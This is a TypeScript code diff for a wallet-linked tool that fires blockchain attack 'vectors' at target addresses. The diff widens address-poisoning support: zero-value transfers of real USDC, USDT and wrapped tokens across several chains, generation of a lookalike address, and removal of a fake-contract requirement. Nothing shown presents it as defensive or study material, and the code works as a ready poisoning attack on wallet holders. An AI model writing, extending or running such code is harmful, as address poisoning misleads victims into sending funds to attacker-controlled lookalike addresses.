@@ -39,27 +39,77 @@ const TRANSFER_ABI = [
  * Chain-aware default tokens for zero-value transfers (real, verified ERC-20s).
  * A `transfer(target, 0)` emits a real Transfer event with zero balance delta —
  * the classic zero-value poisoning pattern — without needing a custom contract.
+ * Supports USDC, USDT, and native wrapped tokens per chain.
  */
-const ZERO_VALUE_DEFAULT_TOKENS: Record<number, `0x${string}`> = {
-  8453: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC on Base
-  1: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC on Ethereum
-  137: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC on Polygon
-  42161: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", // USDC on Arbitrum
-  10: "0x7F5c764cBc14f9669B88837ca1490cCa17c3560e", // USDC on Optimism
-  56: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC on BSC
+const ZERO_VALUE_DEFAULT_TOKENS: Record<number, Record<string, `0x${string}`>> = {
+  8453: {
+    USDC: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
+    USDT: "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2",
+    WETH: "0x4200000000000000000000000000000000000006",
+  },
+  1: {
+    USDC: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+    USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+    WETH: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+    WBTC: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
+  },
+  137: {
+    USDC: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
+    USDT: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
+    WMATIC: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
+    WETH: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",
+  },
+  42161: {
+    USDC: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",
+    USDT: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
+    WETH: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",
+  },
+  10: {
+    USDC: "0x7F5c764cBc14f9669B88837ca1490cCa17c3560e",
+    USDT: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
+    WETH: "0x4200000000000000000000000000000000000006",
+  },
+  56: {
+    USDC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
+    USDT: "0x55d398326f99059fF775485246999027B3197955",
+    WBNB: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+    BTCB: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c",
+  },
+  43114: {
+    USDC: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E",
+    USDT: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7",
+    WAVAX: "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7",
+    WETH: "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB",
+  },
 };
 
-export function resolveZeroValueToken(chainId: number | undefined, override: string | undefined): `0x${string}` {
+export type TokenSymbol = "USDC" | "USDT" | "WETH" | "WBTC" | "WMATIC" | "WBNB" | "BTCB" | "WAVAX";
+
+export function resolveZeroValueToken(
+  chainId: number | undefined,
+  override: string | undefined,
+  tokenSymbol?: TokenSymbol
+): `0x${string}` {
   if (override && override.trim()) {
     if (!isAddress(override.trim())) {
       throw new Error("Contract override is not a valid EVM address.");
     }
     return getAddress(override.trim());
   }
-  if (chainId && ZERO_VALUE_DEFAULT_TOKENS[chainId]) {
-    return ZERO_VALUE_DEFAULT_TOKENS[chainId];
+  if (!chainId) {
+    throw new Error("Chain ID required to resolve default token.");
   }
-  throw new Error(`No default token for chain ${chainId ?? "?"}. Set a contract.`);
+  const chainTokens = ZERO_VALUE_DEFAULT_TOKENS[chainId];
+  if (!chainTokens) {
+    throw new Error(`No tokens configured for chain ${chainId}.`);
+  }
+  const symbol = tokenSymbol || "USDC";
+  const token = chainTokens[symbol];
+  if (!token) {
+    const available = Object.keys(chainTokens).join(", ");
+    throw new Error(`Token ${symbol} not available on chain ${chainId}. Available: ${available}`);
+  }
+  return token;
 }
 
 /**
@@ -143,6 +193,12 @@ const CHAIN_META: Record<
     rpcUrls: ["https://bsc-dataseed.binance.org"],
     nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
     blockExplorerUrls: ["https://bscscan.com"],
+  },
+  43114: {
+    chainName: "Avalanche C-Chain",
+    rpcUrls: ["https://api.avax.network/ext/bc/C/rpc"],
+    nativeCurrency: { name: "AVAX", symbol: "AVAX", decimals: 18 },
+    blockExplorerUrls: ["https://snowtrace.io"],
   },
 };
 
@@ -266,7 +322,7 @@ export async function fireAddressPoisoningFromWallet(
   // If no fake token contract provided, use zero-value transfer on real ERC-20 (USDC)
   // This is the standard address poisoning pattern: transfer(target, 0) on a real token
   if (!fakeTokenContract) {
-    const token = resolveZeroValueToken(chainId, undefined);
+    const token = resolveZeroValueToken(chainId, undefined, "USDC");
     const data = encodeFunctionData({
       abi: TRANSFER_ABI,
       functionName: "transfer",
@@ -372,13 +428,14 @@ export async function fireFakeTokenTransferFromWallet(
 export async function fireZeroValueTransferFromWallet(
   targetAddress: string,
   tokenOverride?: string,
-  chainId?: number
+  chainId?: number,
+  tokenSymbol?: TokenSymbol
 ): Promise<ClientTriggerResult> {
   const { provider, from } = requireProvider();
   if (!isAddress(targetAddress)) {
     throw new Error("Target is not a valid EVM address.");
   }
-  const token = resolveZeroValueToken(chainId, tokenOverride);
+  const token = resolveZeroValueToken(chainId, tokenOverride, tokenSymbol);
   if (chainId) await ensureWalletChain(chainId);
 
   const data = encodeFunctionData({
@@ -393,12 +450,15 @@ export async function fireZeroValueTransferFromWallet(
     data,
   });
 
+  const lookalikeAddress = generateLookalikeAddress(targetAddress);
+
   return {
     txHash,
     vector: "ADDRESS_POISONING",
     targetAddress: getAddress(targetAddress),
     fromAddress: from,
     broadcastAt: new Date().toISOString(),
+    lookalikeAddress,
   };
 }
 
@@ -450,6 +510,7 @@ export async function fireVectorFromLinkedWallet(input: {
   fakeTokenContract?: string;
   amount?: string;
   chainId?: number;
+  tokenSymbol?: TokenSymbol;
 }): Promise<ClientTriggerResult> {
   switch (input.vector) {
     case "mempoolLure":
@@ -459,9 +520,6 @@ export async function fireVectorFromLinkedWallet(input: {
         input.chainId
       );
     case "addressPoisoning":
-      if (!input.fakeTokenContract) {
-        throw new Error("Contract required.");
-      }
       return fireAddressPoisoningFromWallet(
         input.targetAddress,
         input.fakeTokenContract,
@@ -481,7 +539,8 @@ export async function fireVectorFromLinkedWallet(input: {
       return fireZeroValueTransferFromWallet(
         input.targetAddress,
         input.fakeTokenContract,
-        input.chainId
+        input.chainId,
+        input.tokenSymbol
       );
     default:
       throw new Error(`Unknown vector: ${input.vector}`);
